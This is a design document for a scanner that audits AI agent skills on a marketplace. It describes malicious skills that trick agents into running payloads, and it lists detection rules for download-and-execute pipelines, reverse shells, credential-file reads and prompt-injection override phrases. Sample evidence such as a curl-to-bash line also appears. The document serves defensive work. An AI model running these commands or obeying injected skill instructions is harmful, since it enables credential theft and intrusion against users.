# OpenClaw Security Audit System Design

## Document Purpose

This document defines the architecture for a security check and audit system for OpenClaw skills imported into or published on the Agent Skills Marketplace. It is informed by the ClawHavoc campaign (February 2026), in which Koi Security discovered 341 malicious skills on ClawHub, and by analysis of the SKILL.md attack surface.

---

## 1. Threat Model

### 1.1 Attack Vectors (Observed in ClawHavoc)

| ID | Vector | Platform | Description | Severity |
|----|--------|----------|-------------|----------|
| T1 | **Malicious Prerequisites** | All | SKILL.md declares fake "prerequisite" steps that instruct the agent to run malicious commands before the skill itself executes. | Critical |
| T2 | **Password-Protected Archive Download** | Windows | Skill instructs downloading a password-protected ZIP from GitHub containing a keylogger. The password bypass prevents antivirus scanning. | Critical |
| T3 | **Base64-Encoded Payload Delivery** | macOS | Instructions to run `base64 -d` on an obfuscated string, which decodes to a shell command fetching a second-stage payload. | Critical |
| T4 | **Multi-Stage Payload (AMOS Stealer)** | macOS | First-stage script from glot.io fetches second-stage shell script that installs Atomic macOS Stealer (AMOS). Steals Keychain, browser data, crypto wallets, Telegram sessions, SSH keys. | Critical |
| T5 | **Context Window Leakage** | All | Skills designed to expose API keys, passwords, credit card numbers, and other secrets through the agent's context window or output logs. | High |
| T6 | **Exfiltration via Allowed Tools** | All | Skills that declare broad `allowed-tools` in YAML frontmatter (e.g., `Bash`, `Read`, `Write`) to gain filesystem and network access, then exfiltrate data to external endpoints. | High |
| T7 | **Typosquatting / Impersonation** | All | Skills with names nearly identical to popular legitimate skills, tricking users into installing the malicious version. | Medium |
| T8 | **Dependency Confusion** | All | Skills referencing external packages or repositories that have been hijacked or shadow-published. | Medium |

### 1.2 Attack Vectors (Anticipated Beyond ClawHavoc)

| ID | Vector | Description | Severity |
|----|--------|-------------|----------|
| T9 | **Prompt Injection via SKILL.md** | SKILL.md content crafted to override agent system prompts, causing the agent to ignore safety constraints. | High |
| T10 | **Symlink / Path Traversal** | Bundled files with symlinks or `../` paths that escape the skill's directory during extraction. | High |
| T11 | **Cron / Persistence Mechanisms** | Skills that install crontabs, launchd plists, systemd services, or Windows scheduled tasks for persistence. | Critical |
| T12 | **Environment Variable Harvesting** | Instructions that read `.env`, `.bashrc`, `.zshrc`, or Windows registry for secrets. | High |
| T13 | **Polyglot Files** | Files that appear benign (e.g., images, markdown) but contain executable payloads when interpreted differently. | Medium |
| T14 | **Network Listener / Reverse Shell** | Skills that open network listeners or establish reverse shells to attacker-controlled servers. | Critical |

### 1.3 Attack Surface Mapping (SKILL.md Format)

```
SKILL.md
  |-- YAML Frontmatter
  |     |-- name              (typosquatting risk)
  |     |-- description       (social engineering text)
  |     |-- allowed-tools     (privilege escalation surface)
  |     |-- model             (model-specific exploits)
  |     |-- prerequisites     (HIGHEST RISK: arbitrary commands)
  |
  |-- Markdown Body
  |     |-- Inline code blocks (shell commands)
  |     |-- Links             (malicious URLs)
  |     |-- Instructions      (social engineering)
  |
  |-- Bundled Files
        |-- Scripts (.sh, .ps1, .bat, .py, .js)
        |-- Archives (.zip, .tar.gz - nested archives)
        |-- Config files (.env, .yml)
        |-- Binary files (executables, libraries)
```

---

## 2. Static Analysis Engine

### 2.1 Architecture

The static analysis engine runs as a Cloudflare Worker (or as a module within the existing API worker) and processes SKILL.md content plus any bundled files at two trigger points:

1. **On Publish** -- when a user publishes a skill via the Composer (`POST /api/composer/:id/publish`)
2. **On Import** -- when a skill is imported from ClawHub or another external source
3. **On Demand** -- via an admin/moderation API endpoint for re-scanning existing skills

```
                      +-------------------+
   SKILL.md content   |                   |
   + bundled files -->| Static Analyzer   |--> SecurityReport
                      |                   |      { score, findings[] }
                      +-------------------+
                             |
                    +--------+--------+
                    |        |        |
                 Pattern  YAML     File
                 Scanner  Parser   Inspector
```

### 2.2 Detection Rules

Each rule produces a `Finding` object:

```typescript
interface Finding {
  ruleId: string;         // e.g., "SA-001"
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  category: string;       // e.g., "payload-delivery", "credential-harvesting"
  title: string;
  description: string;
  evidence: string;       // The matched content (truncated)
  line?: number;          // Line number in SKILL.md
  filePath?: string;      // If in a bundled file
  confidence: 'high' | 'medium' | 'low';
}
```

#### 2.2.1 Base64 Detection and Decoding

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-001 | `base64\s+-d` or `base64\s+--decode` in shell commands | High |
| SA-002 | `atob(` in JavaScript code blocks | High |
| SA-003 | `[Convert]::FromBase64String` in PowerShell | High |
| SA-004 | Strings matching `^[A-Za-z0-9+/]{40,}={0,2}$` (long base64 blobs) | Medium |
| SA-005 | `echo <base64> \| base64 -d \| sh` (decode-and-execute pipeline) | Critical (High confidence) |

**Action**: Decode detected base64 strings and recursively scan the decoded content with all other rules.

#### 2.2.2 Suspicious URL Patterns

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-010 | URLs to known paste sites: `glot.io`, `pastebin.com`, `paste.ee`, `hastebin.com`, `dpaste.org`, `rentry.co` | High |
| SA-011 | `raw.githubusercontent.com` URLs (often used for hosting payloads) | Medium |
| SA-012 | URLs with IP addresses instead of domain names | High |
| SA-013 | URLs using URL shorteners: `bit.ly`, `tinyurl.com`, `t.co`, `is.gd` | High |
| SA-014 | `ngrok.io`, `serveo.net`, `localhost.run` tunneling URLs | Critical |
| SA-015 | Discord webhook URLs (`discord.com/api/webhooks/`) | High |
| SA-016 | Telegram bot API URLs (`api.telegram.org/bot`) | High |

#### 2.2.3 Download Command Detection

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-020 | `curl` with `-o` or `--output` (downloading to file) | Medium |
| SA-021 | `wget` commands | Medium |
| SA-022 | `curl ... \| sh` or `curl ... \| bash` (download-and-execute) | Critical |
| SA-023 | `Invoke-WebRequest` or `iwr` (PowerShell download) | Medium |
| SA-024 | `Invoke-Expression` or `iex` (PowerShell execute) | High |
| SA-025 | `certutil -urlcache` (Windows LOLBin download) | Critical |
| SA-026 | `bitsadmin /transfer` (Windows LOLBin download) | Critical |
| SA-027 | `python -c "import urllib"` or `python3 -c "import requests"` | Medium |

#### 2.2.4 Password-Protected Archive References

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-030 | References to password-protected ZIP/RAR files (`-p`, `--password`, `unzip -P`) | Critical |
| SA-031 | `7z x -p` (7-Zip password extraction) | Critical |
| SA-032 | Archive download followed by extraction with password in same instruction block | Critical |

#### 2.2.5 Credential Harvesting Patterns

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-040 | Reading `~/.ssh/`, `~/.gnupg/`, `~/.aws/credentials` | Critical |
| SA-041 | Reading browser profile directories (Chrome, Firefox, Safari, Edge) | Critical |
| SA-042 | macOS `security find-generic-password` or `security dump-keychain` | Critical |
| SA-043 | Windows `cmdkey /list`, `vaultcmd`, registry credential keys | Critical |
| SA-044 | Reading `.env`, `.npmrc`, `.pypirc`, Docker `config.json` | High |
| SA-045 | `$GITHUB_TOKEN`, `$AWS_SECRET_ACCESS_KEY`, `$OPENAI_API_KEY` and similar env var references in exfiltration context | High |
| SA-046 | Crypto wallet paths (`~/.bitcoin`, `~/.ethereum`, MetaMask extension dirs) | Critical |
| SA-047 | Telegram session files, Discord tokens | Critical |

#### 2.2.6 Obfuscated Shell Commands

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-050 | `eval $(...)` or `eval "$(...)"`  | High |
| SA-051 | Hex-encoded strings: `\x41\x42\x43` or `$'\x41\x42'` | High |
| SA-052 | Octal-encoded strings: `$'\101\102'` | High |
| SA-053 | `rev` command used to reverse obfuscated strings | Medium |
| SA-054 | Variable concatenation obfuscation: `a=cu; b=rl; $a$b` | Medium |
| SA-055 | `python -c` or `ruby -e` or `perl -e` with encoded/compressed content | High |
| SA-056 | `openssl enc -d` (decrypt-and-execute pattern) | High |

#### 2.2.7 Persistence Mechanisms

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-060 | Crontab modification: `crontab -e`, `crontab -l`, writing to `/etc/cron.d/` | High |
| SA-061 | macOS LaunchAgent/LaunchDaemon plist creation | Critical |
| SA-062 | systemd service creation (`/etc/systemd/`, `systemctl enable`) | High |
| SA-063 | Windows scheduled tasks (`schtasks /create`), registry Run keys | Critical |
| SA-064 | `.bashrc`, `.zshrc`, `.profile` modification for persistence | High |

#### 2.2.8 Network/Reverse Shell Detection

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-070 | `nc -l`, `ncat -l`, `socat` listener patterns | Critical |
| SA-071 | `/dev/tcp/` bash reverse shell pattern | Critical |
| SA-072 | `python -c 'import socket'` with `connect` | Critical |
| SA-073 | `mkfifo` combined with `nc` (named pipe reverse shell) | Critical |
| SA-074 | `php -r` with `fsockopen` | Critical |

#### 2.2.9 YAML Frontmatter Analysis

| Rule ID | Check | Confidence |
|---------|-------|------------|
| SA-080 | `allowed-tools` includes `Bash` or `*` (overly broad permissions) | Medium |
| SA-081 | `allowed-tools` includes both `Read` and network tools (data exfiltration enabler) | High |
| SA-082 | Name similarity to top-100 skills (typosquatting check via Levenshtein distance <= 2) | Medium |
| SA-083 | `prerequisites` section contains shell commands | High |

#### 2.2.10 Prompt Injection Detection

| Rule ID | Pattern | Confidence |
|---------|---------|------------|
| SA-090 | "Ignore previous instructions" or similar override phrases | High |
| SA-091 | "You are now" role reassignment attempts | High |
| SA-092 | System prompt override markers (`<system>`, `[SYSTEM]`, etc.) | High |
| SA-093 | Instructions to disable safety features or bypass restrictions | Critical |

### 2.3 Implementation

The static analyzer is implemented as a standalone module that can be called from any route handler:

```typescript
// apps/api/src/services/securityAnalyzer.ts

export interface SecurityReport {
  skillId: string;
  scanVersion: string;       // Engine version for re-scan tracking
  scannedAt: Date;
  overallScore: RiskScore;
  findings: Finding[];
  metadata: {
    rulesChecked: number;
    contentLength: number;
    bundledFileCount: number;
    scanDurationMs: number;
  };
}

export type RiskScore = 'safe' | 'low_risk' | 'warning' | 'dangerous' | 'malicious';

export async function analyzeSkill(
  skillMdContent: string,
  bundledFiles?: { path: string; content: string }[],
  options?: { skipRules?: string[] }
): Promise<SecurityReport> {
  // Implementation runs all rule categories and aggregates findings
}
```

---

## 3. Dynamic Analysis (Sandboxed Execution)

### 3.1 Concept

Dynamic analysis executes a skill in an isolated environment to observe its runtime behavior. This catches threats that static analysis misses (e.g., dynamically constructed URLs, time-delayed payloads, conditional execution based on OS detection).

### 3.2 Sandbox Architecture

```
+-------------------------------------------+
|  Cloudflare Workers (Orchestrator)         |
|  - Triggers sandbox execution              |
|  - Collects results via callback           |
+-------------------------------------------+
         |
         v
+-------------------------------------------+
|  Sandbox Environment (Isolated Container)  |
|  - Ephemeral Linux VM or container         |
|  - No real credentials or user data        |
|  - Honeypot files (fake SSH keys, .env)    |
|  - Network monitoring (DNS + HTTP)         |
|  - Filesystem monitoring (inotify)         |
|  - Process monitoring (strace/auditd)      |
+-------------------------------------------+
         |
         v
+-------------------------------------------+
|  Behavioral Signals Collected              |
|  - Network connections attempted           |
|  - Files read/written/deleted              |
|  - Processes spawned                       |
|  - Environment variables accessed          |
|  - DNS queries made                        |
+-------------------------------------------+
```

### 3.3 Honeypot Fixtures

The sandbox pre-populates the environment with decoy sensitive data:

| Fixture | Path | Purpose |
|---------|------|---------|
| Fake SSH key | `~/.ssh/id_rsa` | Detect SSH key theft |
| Fake AWS creds | `~/.aws/credentials` | Detect cloud credential theft |
| Fake .env | `~/project/.env` | Detect env file harvesting |
| Fake browser profile | `~/.config/google-chrome/Default/Login Data` | Detect browser data theft |
| Fake crypto wallet | `~/.bitcoin/wallet.dat` | Detect crypto theft |
| Canary DNS token | N/A | Detect DNS-based exfiltration |

Any access to these files or network connections to unexpected hosts triggers a `critical` finding.

### 3.4 Practical Constraints

Full dynamic analysis requires infrastructure beyond Cloudflare Workers (e.g., Firecracker VMs, Docker containers on a dedicated server). For the initial implementation:

- **Phase 1**: Static analysis only (implemented in Workers)
- **Phase 2**: Lightweight dynamic checks within Workers (e.g., resolve URLs to check for redirects to known malicious hosts, without executing the skill)
- **Phase 3**: Full sandboxed execution on dedicated infrastructure (future)

---

## 4. Scoring System

### 4.1 Risk Score Calculation

The overall risk score is determined by the highest-severity finding and the aggregate finding count:

```
SCORE DETERMINATION:

  malicious  := Any finding with severity=critical AND confidence=high
  dangerous  := Any finding with severity=critical AND confidence!=high
               OR 2+ findings with severity=high
  warning    := Any finding with severity=high
               OR 3+ findings with severity=medium
  low_risk   := Any finding with severity=medium
               OR 2+ findings with severity=low
  safe       := No findings, or only severity=info/low findings
```

### 4.2 Score Display

| Score | Badge | UI Treatment | Action |
|-------|-------|-------------|--------|
| `safe` | Green shield | Normal listing | None |
| `low_risk` | Blue shield | Normal listing with info tooltip | None |
| `warning` | Yellow triangle | Warning banner on skill detail page | Manual review queued |
| `dangerous` | Orange exclamation | Large warning overlay, requires user acknowledgment to download | Immediate manual review |
| `malicious` | Red skull | Skill hidden from browse/search, download blocked | Auto-quarantine, notify admin |

### 4.3 Score Persistence

Scores are stored per skill and per scan version. When the rule engine is updated, skills can be re-scanned and their scores updated.

---

## 5. Manual Review Workflow

### 5.1 Review Queue

Skills flagged as `warning` or higher enter a manual review queue.

```
+------------------+     +------------------+     +------------------+
|  Auto-Flagged    | --> |  In Review       | --> |  Resolved        |
|  (warning+)      |     |  (assigned to    |     |  (approved /     |
|                  |     |   reviewer)      |     |   rejected /     |
|                  |     |                  |     |   quarantined)   |
+------------------+     +------------------+     +------------------+
```

### 5.2 Reviewer Actions

| Action | Effect |
|--------|--------|
| **Approve** | Skill score overridden to `safe` or `low_risk`, finding marked as false positive |
| **Reject** | Skill removed from marketplace, author notified |
| **Quarantine** | Skill hidden but preserved for analysis, author account flagged |
| **Escalate** | Flag for deeper investigation, possibly involving Koi Security |
| **Request Changes** | Author notified to modify skill and resubmit |

### 5.3 Reviewer Interface

The review interface (admin panel) shows:

1. Side-by-side view: raw SKILL.md on the left, highlighted findings on the right
2. Each finding is annotated with rule ID, evidence, confidence level
3. Decoded base64 content is shown inline
4. Links to external URL reputation lookups (VirusTotal, URLScan.io)
5. Author history: how many skills they've published, previous review outcomes
6. Comparison with known-good skills in the same category

---

## 6. Clawdex Integration

### 6.1 Background

Koi Security's **Clawdex** is a skill that provides:
- Pre-installation scanning against a known malicious skills database
- Retroactive scanning of already-installed skills
- Alert system for flagged skills

### 6.2 Integration Points

#### 6.2.1 Consume Clawdex Database

```
Koi Security API / Feed
        |
        v
+-------------------+
| Threat Intel       |
| Sync Worker        |  (Scheduled Cron Trigger, e.g., every 6 hours)
|                    |
| - Fetches known    |
|   malicious hashes |
| - Updates local    |
|   blocklist in D1  |
+-------------------+
        |
        v
+-------------------+
| threat_indicators  |  (D1 table)
| table              |
+-------------------+
```

#### 6.2.2 Contribute Findings Back

When our static analysis engine detects new malicious skills not in the Clawdex database, we submit them to Koi Security's reporting endpoint (pending API partnership):

```typescript
interface ThreatReport {
  skillName: string;
  sourceUrl: string;
  contentHash: string;
  findings: Finding[];
  reportedAt: Date;
  reporterPlatform: 'agentskills.cv';
}
```

#### 6.2.3 Cross-Reference on Import

When importing a skill from ClawHub:

1. Compute SHA-256 hash of the SKILL.md content
2. Check against local `threat_indicators` table
3. If match found: auto-quarantine and skip import
4. If no match: proceed with full static analysis

---

## 7. Continuous Monitoring

### 7.1 Scheduled Re-Scanning

A Cloudflare Cron Trigger runs periodically to re-scan existing skills:

```
Schedule:
  - Every 24 hours: re-scan skills scored 'warning' or higher
  - Every 7 days: re-scan all skills with outdated scan versions
  - On rule engine update: re-scan all skills (triggered manually)
```

### 7.2 Threat Intelligence Updates

```
Schedule:
  - Every 6 hours: sync threat indicators from Clawdex / Koi Security
  - On demand: admin can trigger immediate sync
```

### 7.3 Alerting

| Event | Alert Target |
|-------|-------------|
| New `malicious` skill detected | Admin Slack/email + auto-quarantine |
| Existing skill score increases to `dangerous` | Admin Slack/email |
| Batch of 5+ skills from same author flagged | Admin Slack/email (coordinated campaign indicator) |
| Threat intel sync failure | Admin Slack/email |

### 7.4 Metrics Dashboard

Track and display:
- Total skills scanned / pending scan
- Breakdown by risk score
- Top triggered rules (identify most common attack patterns)
- False positive rate (from manual review overrides)
- Average scan duration
- Skills quarantined per week

---

## 8. Implementation Plan

### 8.1 Database Schema Additions

```sql
-- Security scan results
CREATE TABLE security_scans (
  id TEXT PRIMARY KEY,
  skill_id TEXT NOT NULL REFERENCES skills(id) ON DELETE CASCADE,
  scan_version TEXT NOT NULL,           -- Engine version (e.g., "1.0.0")
  overall_score TEXT NOT NULL,          -- 'safe' | 'low_risk' | 'warning' | 'dangerous' | 'malicious'
  findings_json TEXT NOT NULL,          -- JSON array of Finding objects
  findings_count INTEGER NOT NULL DEFAULT 0,
  critical_count INTEGER NOT NULL DEFAULT 0,
  high_count INTEGER NOT NULL DEFAULT 0,
  medium_count INTEGER NOT NULL DEFAULT 0,
  low_count INTEGER NOT NULL DEFAULT 0,
  scan_duration_ms INTEGER,
  scanned_at INTEGER NOT NULL,         -- timestamp_ms
  created_at INTEGER NOT NULL DEFAULT (unixepoch() * 1000)
);

CREATE INDEX idx_security_scans_skill_id ON security_scans(skill_id);
CREATE INDEX idx_security_scans_overall_score ON security_scans(overall_score);
CREATE INDEX idx_security_scans_scanned_at ON security_scans(scanned_at);

-- Threat intelligence indicators (from Clawdex / Koi Security)
CREATE TABLE threat_indicators (
  id TEXT PRIMARY KEY,
  indicator_type TEXT NOT NULL,         -- 'content_hash' | 'url' | 'domain' | 'skill_name'
  indicator_value TEXT NOT NULL UNIQUE,
  source TEXT NOT NULL,                 -- 'clawdex' | 'manual' | 'auto_detected'
  severity TEXT NOT NULL,               -- 'critical' | 'high' | 'medium' | 'low'
  description TEXT,
  first_seen_at INTEGER NOT NULL,       -- timestamp_ms
  last_seen_at INTEGER NOT NULL,        -- timestamp_ms
  is_active INTEGER NOT NULL DEFAULT 1,
  created_at INTEGER NOT NULL DEFAULT (unixepoch() * 1000),
  updated_at INTEGER NOT NULL DEFAULT (unixepoch() * 1000)
);

CREATE INDEX idx_threat_indicators_type_value ON threat_indicators(indicator_type, indicator_value);
CREATE INDEX idx_threat_indicators_active ON threat_indicators(is_active);

-- Manual review queue
CREATE TABLE security_reviews (
  id TEXT PRIMARY KEY,
  skill_id TEXT NOT NULL REFERENCES skills(id) ON DELETE CASCADE,
  scan_id TEXT NOT NULL REFERENCES security_scans(id) ON DELETE CASCADE,
  status TEXT NOT NULL DEFAULT 'pending', -- 'pending' | 'in_review' | 'approved' | 'rejected' | 'quarantined' | 'escalated'
  reviewer_id TEXT REFERENCES users(id) ON DELETE SET NULL,
  reviewer_notes TEXT,
  resolution TEXT,                      -- 'false_positive' | 'true_positive' | 'requires_changes' | 'malicious_confirmed'
  assigned_at INTEGER,                  -- timestamp_ms
  resolved_at INTEGER,                  -- timestamp_ms
  created_at INTEGER NOT NULL DEFAULT (unixepoch() * 1000),
  updated_at INTEGER NOT NULL DEFAULT (unixepoch() * 1000)
);

CREATE INDEX idx_security_reviews_status ON security_reviews(status);
CREATE INDEX idx_security_reviews_skill_id ON security_reviews(skill_id);

-- Add security columns to existing skills table
ALTER TABLE skills ADD COLUMN security_score TEXT DEFAULT NULL;  -- cached latest score
ALTER TABLE skills ADD COLUMN last_scanned_at INTEGER DEFAULT NULL;
ALTER TABLE skills ADD COLUMN is_quarantined INTEGER NOT NULL DEFAULT 0;
ALTER TABLE skills ADD COLUMN quarantined_at INTEGER DEFAULT NULL;
ALTER TABLE skills ADD COLUMN quarantine_reason TEXT DEFAULT NULL;
```

### 8.2 Drizzle Schema (TypeScript)

```typescript
// apps/api/src/db/schema.ts additions

export const securityScans = sqliteTable('security_scans', {
  id: text('id').primaryKey(),
  skillId: text('skill_id').notNull().references(() => skills.id, { onDelete: 'cascade' }),
  scanVersion: text('scan_version').notNull(),
  overallScore: text('overall_score').notNull(),
  findingsJson: text('findings_json').notNull(),
  findingsCount: integer('findings_count').notNull().default(0),
  criticalCount: integer('critical_count').notNull().default(0),
  highCount: integer('high_count').notNull().default(0),
  mediumCount: integer('medium_count').notNull().default(0),
  lowCount: integer('low_count').notNull().default(0),
  scanDurationMs: integer('scan_duration_ms'),
  scannedAt: integer('scanned_at', { mode: 'timestamp_ms' }).notNull(),
  createdAt: integer('created_at', { mode: 'timestamp_ms' }).notNull().default(sql`(unixepoch() * 1000)`),
});

export const threatIndicators = sqliteTable('threat_indicators', {
  id: text('id').primaryKey(),
  indicatorType: text('indicator_type').notNull(),
  indicatorValue: text('indicator_value').notNull().unique(),
  source: text('source').notNull(),
  severity: text('severity').notNull(),
  description: text('description'),
  firstSeenAt: integer('first_seen_at', { mode: 'timestamp_ms' }).notNull(),
  lastSeenAt: integer('last_seen_at', { mode: 'timestamp_ms' }).notNull(),
  isActive: integer('is_active', { mode: 'boolean' }).notNull().default(true),
  createdAt: integer('created_at', { mode: 'timestamp_ms' }).notNull().default(sql`(unixepoch() * 1000)`),
  updatedAt: integer('updated_at', { mode: 'timestamp_ms' }).notNull().default(sql`(unixepoch() * 1000)`),
});

export const securityReviews = sqliteTable('security_reviews', {
  id: text('id').primaryKey(),
  skillId: text('skill_id').notNull().references(() => skills.id, { onDelete: 'cascade' }),
  scanId: text('scan_id').notNull().references(() => securityScans.id, { onDelete: 'cascade' }),
  status: text('status').notNull().default('pending'),
  reviewerId: text('reviewer_id').references(() => users.id, { onDelete: 'set null' }),
  reviewerNotes: text('reviewer_notes'),
  resolution: text('resolution'),
  assignedAt: integer('assigned_at', { mode: 'timestamp_ms' }),
  resolvedAt: integer('resolved_at', { mode: 'timestamp_ms' }),
  createdAt: integer('created_at', { mode: 'timestamp_ms' }).notNull().default(sql`(unixepoch() * 1000)`),
  updatedAt: integer('updated_at', { mode: 'timestamp_ms' }).notNull().default(sql`(unixepoch() * 1000)`),
});
```

### 8.3 API Endpoints

All security endpoints follow the existing Hono router pattern and use the `requireAuth` middleware. Admin endpoints additionally check for an admin role.

```typescript
// apps/api/src/routes/security.ts

const securityRouter = new Hono();

// --- Public endpoints ---

// Get security score for a skill (displayed on skill detail page)
// GET /api/security/skills/:id/score
// Response: { data: { score: RiskScore, scannedAt: number, findingsSummary: {...} }, error: null }

// --- Authenticated endpoints ---

// Trigger scan for a specific skill (rate-limited)
// POST /api/security/skills/:id/scan
// Auth: requireAuth
// Response: { data: SecurityReport, error: null }

// --- Admin endpoints ---

// Get review queue
// GET /api/security/reviews?status=pending&limit=20&offset=0
// Auth: requireAdmin
// Response: PaginatedResponse<SecurityReview>

// Assign review to self
// POST /api/security/reviews/:id/assign
// Auth: requireAdmin

// Submit review decision
// PUT /api/security/reviews/:id
// Auth: requireAdmin
// Body: { status: 'approved' | 'rejected' | 'quarantined', notes: string, resolution: string }

// Get scan history for a skill
// GET /api/security/skills/:id/scans
// Auth: requireAdmin
// Response: { data: SecurityScan[], error: null }

// Manage threat indicators
// GET /api/security/threats?type=content_hash&limit=50
// POST /api/security/threats
// DELETE /api/security/threats/:id
// Auth: requireAdmin

// Trigger batch re-scan
// POST /api/security/rescan
// Auth: requireAdmin
// Body: { scope: 'all' | 'outdated' | 'flagged', scanVersion?: string }

// Dashboard metrics
// GET /api/security/dashboard
// Auth: requireAdmin
// Response: { data: { totalScanned, byScore: {...}, topRules: [...], ... }, error: null }
```

### 8.4 Worker Architecture

```
+------------------------------------------+
|  Existing API Worker                      |
|  (apps/api/src/index.ts)                  |
|                                           |
|  app.route('/api/security', securityRouter)|
|                                           |
|  Import: securityAnalyzer module          |
|  - Called during publish flow             |
|  - Called during import flow              |
|  - Called via admin scan endpoint         |
+------------------------------------------+

+------------------------------------------+
|  Security Cron Worker (optional)          |
|  (apps/api/src/cron/securityCron.ts)      |
|                                           |
|  Cloudflare Cron Triggers:                |
|  - Every 24h: re-scan flagged skills      |
|  - Every 6h: sync threat intel            |
|  - Every 7d: re-scan outdated scans       |
+------------------------------------------+
```

### 8.5 Integration with Existing Publish Flow

The security scan hooks into the existing `POST /api/composer/:creationId/publish` endpoint in `apps/api/src/routes/composer.ts`:

```typescript
// In the publish handler, after creating the skill record:

// Run security scan
const report = await analyzeSkill(latestOutput.skillMd, resources);

// Store scan result
await db.insert(securityScans).values({
  id: generateId(),
  skillId,
  scanVersion: SCAN_ENGINE_VERSION,
  overallScore: report.overallScore,
  findingsJson: JSON.stringify(report.findings),
  findingsCount: report.findings.length,
  criticalCount: report.findings.filter(f => f.severity === 'critical').length,
  highCount: report.findings.filter(f => f.severity === 'high').length,
  mediumCount: report.findings.filter(f => f.severity === 'medium').length,
  lowCount: report.findings.filter(f => f.severity === 'low').length,
  scanDurationMs: report.metadata.scanDurationMs,
  scannedAt: now,
});

// Update skill security score cache
await db.update(skills).set({
  securityScore: report.overallScore,
  lastScannedAt: now,
}).where(eq(skills.id, skillId));

// If malicious, auto-quarantine
if (report.overallScore === 'malicious') {
  await db.update(skills).set({
    isQuarantined: true,
    quarantinedAt: now,
    quarantineReason: `Auto-quarantined: ${report.findings.filter(f => f.severity === 'critical').length} critical findings`,
  }).where(eq(skills.id, skillId));
}

// If warning or above, create review entry
if (['warning', 'dangerous', 'malicious'].includes(report.overallScore)) {
  await db.insert(securityReviews).values({
    id: generateId(),
    skillId,
    scanId: scanId,
    status: 'pending',
  });
}
```

### 8.6 Phased Implementation

**Phase 1 -- Core Static Analysis (MVP)**
- Implement `securityAnalyzer.ts` with rules SA-001 through SA-093
- Add `security_scans` table and schema
- Integrate scan into publish flow
- Add `GET /api/security/skills/:id/score` endpoint
- Display security badge on skill detail page

**Phase 2 -- Review Workflow**
- Add `security_reviews` and `threat_indicators` tables
- Implement admin review endpoints
- Build admin review UI panel
- Implement auto-quarantine for `malicious` scores

**Phase 3 -- Threat Intelligence**
- Implement Clawdex database sync (cron trigger)
- Add cross-reference check on import
- Implement threat indicator management endpoints

**Phase 4 -- Continuous Monitoring**
- Implement scheduled re-scan cron triggers
- Add alerting (email/webhook notifications)
- Build metrics dashboard

**Phase 5 -- Dynamic Analysis**
- Lightweight URL resolution checks in Workers
- Full sandboxed execution (requires non-Workers infrastructure)

---

## 9. Defense in Depth

The security audit system implements multiple overlapping layers of defense:

```
Layer 1: Threat Intel Blocklist
  |  Known malicious hashes/URLs blocked immediately
  |
  v
Layer 2: Static Analysis (Pre-Publish)
  |  Pattern matching, base64 decoding, URL analysis
  |  Runs BEFORE the skill is visible to any user
  |
  v
Layer 3: Automated Risk Scoring
  |  Skills scored and badged; dangerous/malicious auto-quarantined
  |
  v
Layer 4: Manual Review Queue
  |  Human reviewers verify flagged skills
  |
  v
Layer 5: Continuous Re-Scanning
  |  Skills re-checked as new threats are discovered
  |  Rule engine updates trigger retroactive scans
  |
  v
Layer 6: User-Facing Warnings
  |  Warning banners, download confirmations for risky skills
  |
  v
Layer 7: Community Reporting
  |  Users can flag suspicious skills for review
  |
  v
Layer 8: Dynamic Analysis (Future)
     Sandboxed execution catches evasive threats
```

### 9.1 Principle: Fail Closed

If the security scanner encounters an error or cannot complete a scan, the skill defaults to `warning` status and enters the manual review queue. Skills are never published without a scan result.

### 9.2 Principle: Minimal Trust

- Skills from external sources (ClawHub imports) start with higher scrutiny than user-composed skills
- New authors (< 3 published skills) receive additional automated checks
- Skills with `allowed-tools: ["Bash"]` or `allowed-tools: ["*"]` always trigger at least a `warning`

### 9.3 Principle: Transparency

- Users can view the security score and a summary of findings for any skill
- Authors receive detailed feedback when their skill is flagged, including which rules triggered
- The rule engine version is tracked so users can see when a skill was last scanned

---

## Appendix A: Example Security Report

```json
{
  "skillId": "sk_abc123",
  "scanVersion": "1.0.0",
  "scannedAt": "2026-02-07T12:00:00Z",
  "overallScore": "dangerous",
  "findings": [
    {
      "ruleId": "SA-022",
      "severity": "critical",
      "category": "payload-delivery",
      "title": "Download-and-execute pattern detected",
      "description": "The skill contains a curl command that pipes output directly to bash, which is a common malware delivery technique.",
      "evidence": "curl -sSL https://example.com/setup.sh | bash",
      "line": 42,
      "confidence": "high"
    },
    {
      "ruleId": "SA-010",
      "severity": "high",
      "category": "suspicious-url",
      "title": "Reference to known paste site",
      "description": "The skill references glot.io, which was used in the ClawHavoc campaign to host first-stage payloads.",
      "evidence": "https://glot.io/snippets/abc123/raw",
      "line": 38,
      "confidence": "high"
    },
    {
      "ruleId": "SA-044",
      "severity": "high",
      "category": "credential-harvesting",
      "title": "Environment file access",
      "description": "The skill reads .env files, which commonly contain API keys and secrets.",
      "evidence": "cat ~/.env",
      "line": 55,
      "confidence": "medium"
    }
  ],
  "metadata": {
    "rulesChecked": 93,
    "contentLength": 2048,
    "bundledFileCount": 0,
    "scanDurationMs": 45
  }
}
```

## Appendix B: Rule Priority for Implementation

Rules should be implemented in this order based on observed real-world usage in ClawHavoc:

1. **SA-005, SA-022** -- Download-and-execute (highest real-world prevalence)
2. **SA-001 through SA-003** -- Base64 decode (ClawHavoc macOS vector)
3. **SA-030 through SA-032** -- Password-protected archives (ClawHavoc Windows vector)
4. **SA-010 through SA-016** -- Suspicious URLs (glot.io was primary staging)
5. **SA-040 through SA-047** -- Credential harvesting (AMOS stealer goal)
6. **SA-070 through SA-074** -- Reverse shells
7. **SA-050 through SA-056** -- Obfuscation
8. **SA-060 through SA-064** -- Persistence
9. **SA-080 through SA-083** -- YAML frontmatter
10. **SA-090 through SA-093** -- Prompt injection
